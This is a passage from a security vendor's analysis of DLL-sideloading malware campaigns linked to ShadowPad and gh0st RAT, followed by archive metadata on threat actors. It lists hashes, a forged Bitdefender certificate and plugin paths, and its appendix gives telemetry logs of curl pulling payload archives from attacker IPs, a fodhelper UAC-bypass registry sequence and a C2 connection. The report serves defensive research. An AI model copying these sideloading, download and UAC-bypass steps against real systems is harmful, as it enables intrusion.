73048579a2903918bbcc601cd562e8f93459ad2a562c6537006067b59735b7b6\n\nCreation Time 2021-01-25 05:43:52 UTC\n\nSignature Date       05:48 AM 01/25/2021\n\nFirst Submission     2022-01-26 05:43:49 UTC\n\n```\nSigned by a self-signed digital signature claiming to originate from, but not actually\noriginating from, Bitdefender:\n```\nBitDefender SRL\n\nName   BitDefender SRL\n\nStatus This certificate or one of the certificates in the certificate chain is not\n\ntime valid. The certificate or certificate chain is based on an untrusted root.\n\nIssuer BitDefender SRL\n\nValid From    05:48 AM 01/25/2021\n\nValid To      05:48 AM 01/25/2022\n\nValid Usage   All\n\nAlgorithm     sha256RSA\n\nThumbprint    A9CA14BA90962DEA552F6A5FB2E5970ACF939EDE\n\nSerial Number 01\n\n```\n\n-----\n\n_Figure 13: The questionable digital certificate_\n\nIt loads the payload from the file qutmain.dat.\n\nThis sideloading scenario consists of the following files:\n```\n73048579a2903918bbcc601cd562e8f93459ad2a562c6537006067b59735b7b6 *log.dll\n\nbcc588207d62a44149df54bd948815bdcfe60e7864bae00d6cd619f5d6cc2257 *qutload.dat\n\n7529e60f377b24c60914ec909dbfdc0e60ad9e18fbf9750a4463acf33a7ce16f *qutmain.dat\n\n386eb7aa33c76ce671d6685f79512597f1fab28ea46c8ec7d89e58340081e2bd *qutppy.exe\n\nfb65524f27e847ac073a61d2c3eeae6a9447e34836347bbd7baff22a07cf0b01 *vsserver.dat\n\n```\nHere, the .dat files are the encrypted plugins; quttpy.exe is the clean loader from Bitdefender\n(Bitdefender Crash Handler). The use of this clean file in sideloading scenarios has been\nreported (though with different payload files) since early 2021 and attributed to ShadowPad,\naka [NetSarang. (Additionally, Trend Micro detects the encrypted .dat files as](https://news.sophos.com/en-us/2021/03/04/covert-code-faces-a-heap-of-trouble-in-memory/)\nTrojan.Win32.SHADOWPAD.CGW.enc.) There is an additional file info.dat, which should\ncontain the actual configuration data, but we weren’t able to recover it.\n\nThe log.dll loader uses the same obfuscation as the earlier cases, and the decrypted plugin\nfiles used the same shellcode loader. We believe this is a reasonably strong connection with\nthe campaigns in 2022.\n\n\n-----\n\n**Implants**\n\n**qutmain.dat**\n\nThis file is essentially the same as alloc.plg. It refers to the following locations where the\ninstalled plugins are stored:\n```\nC:\\ProgramData\\mos\\qutppy.exe\n\nC:\\ProgramData\\mos\\qutload.dat\n\nC:\\ProgramData\\mos\\qutppy.exe online\n\nC:\\ProgramData\\mos\\info.dat\n\nC:\\ProgramData\\mos\\vsserver.dat\n\nC:\\ProgramData\\mos\\qutppy.exe install\n\n```\nIt generates similar debug messages with the [fortest] tag as well, and contains exactly the\nsame UAC bypass component.\n\n**qutload.dat**\n\nThis is the same as free.plg; only the file paths have changed to reflect the different scenario.\n\n**vssserver.dat**\n\nThis is the same as main.plg. It contains the same hardcoded default config values:\n```\ncfg_find_tag\n\nmark\n\n192.168.211.1\n\n192.168.211.1\n\n```\n**info.dat**\n\nThis is the encrypted configuration file. We haven’t been able to recover it.\n\n### Scenario G: The old-timer\n\nThis is a very early sample (from 2017!) that shows the same obfuscation as the newer\ncases, as well as a similar default hardcoded configuration. It was found via VT.\n\nThe file info:\n```\nMD5    413bb0864c3933009a9cc486f07070e4\n\nSHA-1  f5895c69c995ac8b7f01ff85df9777595fe8b35d\n\nSHA-256 b2a332fb6e896a896f72e6bbbf6351d756f1ab6a57fbe662050ed1c18cad3e4b\n\nCreation Time 2017-03-23 12:20:10 UTC\n\nFirst Submission     2017-05-14 05:16:34 UTC\n\n```\nContains an embedded executable:\n```\n389058c291b536eb65ba3a65e2024eb6350ff1a5ed48c036692bf5fed4729970\n\n```\n\n-----\n\nSome characteristic strings from the embedded executable:\n```\nhTTP/1.1 403 fORBIDDENRNRN<h1>403 fORBIDDEN</h1>\n\nHtTp/1.0 200 OKRNRN\n\n192.168.1.2\n\n```\nAlso, a similar config data is stored, but with a different marker at the beginning:\n```\nmmconfig-tag\n\n192.168.1.33\n\nKarSpy\n\nKarSpy\n\nKar security services\n\n```\nSideloading components could be identified from the code:\n```\n%CommonProgramFiles%\\Sandboxie\\SbieDll.dll\n\n%CommonProgramFiles%\\Sandboxie\\Sandboxie.exe\n\n%CommonProgramFiles%\\Sandboxie\n\n```\nThe malicious DLL is attributed as gh0st RAT. Details of the payload are unavailable at this\ntime.\n\n## Appendix: A Tour of the Worm Circus\n\nFrom our telemetry data we reconstructed the steps of the infection process. Here’s the\ntimeline for Case 4 (“Worm Circus,”) the most complex attack. This is the one that both\ndelivered a USB worm in its payload and ingested portions of other APTs:\n\nExecution of initial sideloading:\n```\n2022-06-24T03:11:11.519857Z   [\n\nc:\\users\\public\\libraries\\ciscocollabhost.exe::38752 ]  === FileRead ===>\n\n   [ c:\\users\\public\\libraries\\ciscosparklauncher.dll ]\n\n2022-06-24T03:11:11.519857Z   [\n\nc:\\users\\public\\libraries\\ciscocollabhost.exe::38752 ]  === FileRead ===>\n\n   [ c:\\users\\public\\2831329086.inf ]\n\nDownloading the RAR archive\n\n2022-06-24T04:02:58.673626Z   [ c:\\windows\\syswow64\\curl.exe::36336 ]\n\n  === IpConnector ===>  [ 103.253.72.116 ]\n\n2022-06-24T04:02:58.793284Z   [ c:\\windows\\syswow64\\curl.exe::36336 ]  \n\n=== FileWrite ===>    [ c:\\users\\public\\libraries\\out\\v1.rar ]\n\n```\nUnpacking the files of the second sideloading:\n\n\n-----\n\n```\n2022 06 24T04:03:54.211485Z   [ c:\\program files\\winrar\\rar.exe::39988 ]  \n=== FileWrite ===>  [ c:\\users\\public\\libraries\\out\\symsrv.dll ]\n\n2022-06-24T04:03:54.243728Z   [ c:\\program files\\winrar\\rar.exe::39988 ]  \n=== FileWrite ===>  [ c:\\users\\public\\libraries\\out\\symstore.exe ]\n\n2022-06-24T04:03:54.249938Z   [ c:\\program files\\winrar\\rar.exe::39988 ]  \n=== FileWrite ===>  [ c:\\users\\public\\libraries\\out\\msvcrt.dll ]\n\n2022-06-24T04:03:54.263187Z   [ c:\\program files\\winrar\\rar.exe::39988 ]  \n=== FileRead ===>  [ c:\\users\\public\\libraries\\out\\v1.rar ]\n\n```\nThis shows execution of the second sideloading attack, which creates registry keys to\nregister a custom file extension and a custom command to open files of that extension. This\n[could be a persistence tactic, similar to how SolarMarker does it.](https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/)\n```\n2022-06-24T04:05:43.119771Z   [\n\nc:\\users\\public\\libraries\\out\\symstore.exe::39668 ]  === FileRead ===>\n\n   [ c:\\users\\public\\libraries\\out\\symsrv.dll ]\n\n2022-06-24T04:05:43.159707Z   [\n\nc:\\users\\public\\libraries\\out\\symstore.exe::39668 ]  === RegKeyCreate ===>\n\n   [ HKEY_USERS\\S-1-5-21-1497078658-3044148255-4064547459\n1001_Classes\\aaabbb32\\shell\\open\\command ]\n\n2022-06-24T04:05:43.160709Z   [\n\nc:\\users\\public\\libraries\\out\\symstore.exe::39668 ]  === RegKeySetValue\n\n===>    [ HKEY_USERS\\S-1-5-21-1497078658-3044148255-4064547459\n1001_Classes\\aaabbb32\\shell\\open\\command ]\n\n2022-06-24T04:05:43.161131Z   [\n\nc:\\users\\public\\libraries\\out\\symstore.exe::39668 ]  === RegKeyCreate ===>\n\n    [ HKEY_USERS\\S-1-5-21-1497078658-3044148255-4064547459-1001_Classes\\mssettings\\CurVer ]\n\n2022-06-24T04:05:43.162128Z   [\n\nc:\\users\\public\\libraries\\out\\symstore.exe::39668 ]  === RegKeySetValue\n\n===>    [ HKEY_USERS\\S-1-5-21-1497078658-3044148255-4064547459\n1001_Classes\\ms-settings\\CurVer ]\n\n```\nCreation of yet another 3.exe file (symstore.exe -> fodhelper.exe -> 3.exe)\n```\n2022-06-24T04:05:43.318703Z   [\n\nc:\\users\\public\\libraries\\out\\symstore.exe::39668 ]  === FileRead ===>\n\n   [ c:\\windows\\system32\\fodhelper.exe ]\n\n2022-06-24T04:05:44.215109Z   [ c:\\windows\\system32\\fodhelper.exe::26224 ]\n\n   === FileRead ===>   [ c:\\users\\public\\libraries\\3.exe ]     \n\n2022-06-24T04:05:44.240169Z   [ c:\\users\\public\\libraries\\3.exe::42928 ]\n\n   === FileRead ===>    [ c:\\windows\\syswow64\\hmpalert.dll ]\n\n2022-06-24T04:05:44.242168Z   [ c:\\users\\public\\libraries\\3.exe::42928 ]\n\n   === FileRead ===>    [ c:\\windows\\system32\\conhost.exe ]\n\n```\nFodhelper.exe executes 3.exe. But before that, the registry key HKEY_USERS\\S-1-5-211497078658-3044148255-4064547459-1001_Classes\\ms-settings\\CurVer is created. This is\n[likely a UAC bypass method similar to the one Pentestlab described in 2017 and more](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)\n[recently used by Trickbot.](https://threatpost.com/trickbot-switches-to-a-new-windows-10-uac-bypass-to-evade-detection/152477/)\n\n\n-----\n\nThe threat actor then executed 3.exe, which deletes the components of sideloading\nscenarios. Note the presence of the files nvsmartmax.dll and nvsmartmax.dat. Cybereason\nhas previously reported that they are used by a Chinese APT group in their attacks.\n```\n2022-06-24T04:05:44.568617Z   [ c:\\users\\public\\libraries\\3.exe::42928 ]\n\n   === FileDelete ===>  [ c:\\programdata\\googleupdate\\googleupdate.exe ]\n\n2022-06-24T04:05:44.570493Z   [ c:\\users\\public\\libraries\\3.exe::42928 ]\n\n   === FileDelete ===>  [ c:\\programdata\\googleupdate\\goopdate.ja ]\n\n2022-06-24T04:05:44.571488Z   [ c:\\users\\public\\libraries\\3.exe::42928 ]\n\n   === FileDelete ===>  [ c:\\programdata\\googleupdate\\libvlc.dll ]\n\n2022-06-24T04:05:44.573479Z   [ c:\\users\\public\\libraries\\3.exe::42928 ]\n\n   === FileDelete ===>  [ c:\\programdata\\googleupdate\\loader.ja ]\n\n2022-06-24T04:05:44.574480Z   [ c:\\users\\public\\libraries\\3.exe::42928 ]\n\n   === FileDelete ===>  [ c:\\programdata\\googleupdate\\nvsmartmax.dat ]\n\n2022-06-24T04:05:44.576644Z   [ c:\\users\\public\\libraries\\3.exe::42928 ]\n\n   === FileDelete ===>  [ c:\\programdata\\googleupdate\\nvsmartmax.dll ]\n\n2022-06-24T04:05:44.577473Z   [ c:\\users\\public\\libraries\\3.exe::42928 ]\n\n   === FileDelete ===>  [ c:\\programdata\\googleupdate\\time.sig ]\n\n2022-06-24T04:05:44.580460Z   [ c:\\users\\public\\libraries\\3.exe::42928 ]\n\n   === RegKeySetValue ===>    [\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S\n1-5-21-1497078658-3044148255-4064547459-1001 ]\n\n```\nDownloading the components of the third sideloading scenario:\n```\n2022-06-24T04:08:34.208478Z   [\n\nc:\\users\\public\\libraries\\ciscocollabhost.exe::38752 ]  === FileRead ===>\n\n   [ c:\\windows\\syswow64\\cmd.exe ]\n\n2022-06-24T04:08:34.348517Z   [ c:\\windows\\syswow64\\cmd.exe::38472 ]\n\n   === FileRead ===>    [ c:\\windows\\syswow64\\curl.exe ]\n\n2022-06-24T04:08:34.732663Z   [ c:\\windows\\syswow64\\curl.exe::41216 ]\n\n  === IpConnector ===>  [ 5.252.178.162 ]\n\n2022-06-24T04:08:35.412783Z   [ c:\\windows\\syswow64\\curl.exe::41216 ]\n\n  === FileWrite ===>    [ c:\\users\\public\\libraries\\out\\c.rar ]\n\n```\nUnpacking the files from the downloaded RAR archive:\n```\n2022-06-24T04:10:14.279520Z   [ c:\\program files\\winrar\\rar.exe::40260 ]\n\n   === FileWrite ===>  [ c:\\users\\public\\libraries\\out\\goopdate.ja ]\n\n2022-06-24T04:10:14.299137Z   [ c:\\program files\\winrar\\rar.exe::40260 ]\n\n   === FileWrite ===>  [ c:\\users\\public\\libraries\\out\\libvlc.dll ]\n\n2022-06-24T04:10:14.301128Z   [ c:\\program files\\winrar\\rar.exe::40260 ]\n\n   === FileWrite ===>  [ c:\\users\\public\\libraries\\out\\loader.ja ]\n\n2022-06-24T04:10:14.307180Z   [ c:\\program files\\winrar\\rar.exe::40260 ]\n\n   === FileWrite ===>  [ c:\\users\\public\\libraries\\out\\time.sig ]\n\n2022-06-24T04:10:14.310114Z   [ c:\\program files\\winrar\\rar.exe::40260 ]\n\n   === FileWrite ===>  [ c:\\users\\public\\libraries\\out\\googleupdate.exe ]\n\n2022-06-24T04:10:14.322856Z   [ c:\\program files\\winrar\\rar.exe::40260 ]\n\n   === FileWrite ===>  [ c:\\users\\public\\libraries\\out\\googleupdate.exe ]\n\n2022-06-24T04:10:14.322856Z   [ c:\\program files\\winrar\\rar.exe::40260 ]\n\n   === FileRead ===>  [ c:\\users\\public\\libraries\\out\\c.rar ]\n\n```\n\n-----\n\nExecution of the third sideloading scenario:\n```\n2022-06-24T04:11:16.921480Z   [\n\nc:\\users\\public\\libraries\\out\\googleupdate.exe::41944 ]  === FileRead ===>\n\n   [ c:\\users\\public\\libraries\\out\\libvlc.dll ]\n\n2022-06-24T04:11:16.962673Z   [\n\nc:\\users\\public\\libraries\\out\\googleupdate.exe::41944 ]  === FileRead ===>\n\n   [ c:\\users\\public\\libraries\\out\\loader.ja ]\n\n```\nConnecting to the server:\n```\n2022-06-24T04:18:11.335261Z   [\n\nc:\\users\\public\\libraries\\ciscocollabhost.exe::38752 ]  === IpConnector ===>\n\n   [ 91.245.253[.]52 ]\n\n```\nThe threat actor executed symstore.exe, with a few different command line arguments:\n```\n     \"commandLine\" :\n\n\"C:\\\\Users\\\\Public\\\\Libraries\\\\out\\\\symstore.exe \n\nC:\\\\Users\\\\Public\\\\Libraries\\\\out\\\\googleupdate.exe\",\n\n     \"commandLine\" :\n\n\"C:\\\\Users\\\\Public\\\\Libraries\\\\out\\\\symstore.exe \n\nC:\\\\users\\\\public\\\\libraries\\\\3.exe\",\n\n     \"commandLine\" :\n\n\"C:\\\\Users\\\\Public\\\\Libraries\\\\out\\\\symstore.exe \\\"mkdir\n\nC:\\\\programdata\\\\googleupdate\\\"\",\n\n```\nIt is likely that the sideloaded DLL component (symsrv.dll) takes these command-line\nparameters and executes using the fodhelper.exe UAC bypass trick.\n\n[IOCs for these attacks will be available on our GitHub repository.](https://github.com/sophoslabs/IoCs)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-11-03 - Family Tree- DLL-Sideloading Cases May Be Related.pdf"
    ],
    "report_names": [
        "2022-11-03 - Family Tree- DLL-Sideloading Cases May Be Related.pdf"
    ],
    "threat_actors": [
        {
            "id": "7c00086d-9535-4552-8201-1dd725e41b12",
            "created_at": "2023-04-26T02:03:03.128736Z",
            "updated_at": "2025-03-27T02:00:55.516541Z",
            "deleted_at": null,
            "main_name": "LuminousMoth",
            "aliases": [
                "LuminousMoth"
            ],
            "source_name": "MITRE:LuminousMoth",
            "tools": [
                "PlugX",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "92049df8-7902-48e8-ad17-97398b923698",
            "created_at": "2022-10-25T16:07:23.81315Z",
            "updated_at": "2025-03-27T02:02:09.990217Z",
            "deleted_at": null,
            "main_name": "LuminousMoth",
            "aliases": [],
            "source_name": "ETDA:LuminousMoth",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "23dfc9f5-1862-4510-a6ae-53d8e51f17b1",
            "created_at": "2024-05-01T02:03:08.146025Z",
            "updated_at": "2025-03-27T02:05:17.420497Z",
            "deleted_at": null,
            "main_name": "PLATINUM TERMINAL",
            "aliases": [
                "Longhorn ",
                "The Lamberts ",
                "Vault7 ",
                "APT-C-39 "
            ],
            "source_name": "Secureworks:PLATINUM TERMINAL",
            "tools": [
                " Assassin",
                " Marble Framework",
                "AfterMidnight"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1691c25f-1aa4-4168-8ce2-7aa8f23246e7",
            "created_at": "2024-06-04T02:03:07.724221Z",
            "updated_at": "2025-03-27T02:05:17.284601Z",
            "deleted_at": null,
            "main_name": "BRONZE PRESIDENT",
            "aliases": [
                "Mustang Panda ",
                "Red Lich ",
                "Temp.Hex ",
                "HoneyMyte "
            ],
            "source_name": "Secureworks:BRONZE PRESIDENT",
            "tools": [
                " Cobalt Strike",
                " ORat",
                " PlugX",
                " RCSession",
                "China Chopper"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b69037ec-2605-4de4-bb32-a20d780a8406",
            "created_at": "2023-01-06T13:46:38.790766Z",
            "updated_at": "2025-03-27T02:00:02.919758Z",
            "deleted_at": null,
            "main_name": "MUSTANG PANDA",
            "aliases": [
                "TEMP.HEX",
                "TA416",
                "TANTALUM",
                "Twill Typhoon",
                "Earth Preta",
                "Stately Taurus",
                "LuminousMoth",
                "Polaris",
                "BRONZE PRESIDENT",
                "HoneyMyte",
                "Red Lich"
            ],
            "source_name": "MISPGALAXY:MUSTANG PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9baa7519-772a-4862-b412-6f0463691b89",
            "created_at": "2022-10-25T15:50:23.354429Z",
            "updated_at": "2025-03-27T02:00:55.45162Z",
            "deleted_at": null,
            "main_name": "Mustang Panda",
            "aliases": [
                "Mustang Panda",
                "TA416",
                "RedDelta",
                "BRONZE PRESIDENT"
            ],
            "source_name": "MITRE:Mustang Panda",
            "tools": [
                "Cobalt Strike",
                "RCSession",
                "NBTscan",
                "PoisonIvy",
                "PlugX"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2ee03999-5432-4a65-a850-c543b4fefc3d",
            "created_at": "2022-10-25T16:07:23.882813Z",
            "updated_at": "2025-03-27T02:02:10.0116Z",
            "deleted_at": null,
            "main_name": "Mustang Panda",
            "aliases": [
                "Bronze President",
                "Camaro Dragon",
                "Earth Preta",
                "HoneyMyte",
                "Mustang Panda",
                "Operation SMUGX",
                "Operation SmugX",
                "PKPLUG",
                "Red Lich",
                "Stately Taurus",
                "TEMP.Hex"
            ],
            "source_name": "ETDA:Mustang Panda",
            "tools": [
                "9002 RAT",
                "AdFind",
                "Agent.dhwf",
                "Agentemis",
                "CHINACHOPPER",
                "China Chopper",
                "Chymine",
                "ClaimLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "DCSync",
                "DOPLUGS",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Farseer",
                "Gen:Trojan.Heur.PT",
                "HOMEUNIX",
                "Hdump",
                "HenBox",
                "HidraQ",
                "Hodur",
                "Homux",
                "HopperTick",
                "Hydraq",
                "Impacket",
                "Kaba",
                "Korplug",
                "LadonGo",
                "MQsTTang",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "NBTscan",
                "NetSess",
                "Netview",
                "Orat",
                "POISONPLUG.SHADOW",
                "PUBLOAD",
                "PVE Find AD Users",
                "PlugX",
                "Poison Ivy",
                "PowerView",
                "QMAGENT",
                "RCSession",
                "RedDelta",
                "Roarur",
                "SPIVY",
                "ShadowPad Winnti",
                "SinoChopper",
                "Sogu",
                "TIGERPLUG",
                "TONEINS",
                "TONESHELL",
                "TVT",
                "TeamViewer",
                "Thoper",
                "TinyNote",
                "WispRider",
                "WmiExec",
                "XShellGhost",
                "Xamtrav",
                "Zupdax",
                "cobeacon",
                "nbtscan",
                "nmap",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536171,
    "ts_updated_at": 1743041806,
    "ts_creation_date": 1672273264,
    "ts_modification_date": 1672273264,
    "files": {
        "pdf": "https://archive.orkl.eu/bf0b9926a49aec9acd99d1f73fabe330545b01b5.pdf",
        "text": "https://archive.orkl.eu/bf0b9926a49aec9acd99d1f73fabe330545b01b5.txt",
        "img": "https://archive.orkl.eu/bf0b9926a49aec9acd99d1f73fabe330545b01b5.jpg"
    }
}